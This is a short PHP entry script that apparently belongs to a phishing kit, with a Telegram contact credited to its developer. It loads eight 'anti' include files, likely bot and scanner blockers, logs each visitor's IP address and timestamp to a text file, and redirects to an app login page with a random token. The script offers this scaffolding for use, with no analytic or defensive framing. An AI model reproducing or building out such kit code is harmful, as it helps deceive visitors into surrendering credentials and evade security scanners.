<?php 
/*

//Contact Info:
//==================================
// Telegram : https://t.me/DevDaniel_100
//================================== 
// Channel 🔰 :  https://t.me/devdaniel_channel
//==================================

*/

include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
ob_start();
session_start();

date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A");
$iiiip=$_SERVER['REMOTE_ADDR'];
$code=" $iiiip | {$dateNow} \r\n";
$save=fopen("./ip.txt","a+");
fwrite($save,$code);
fclose($save);
$xxx = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
header("Location: ./app/login.php?$xxx");
?>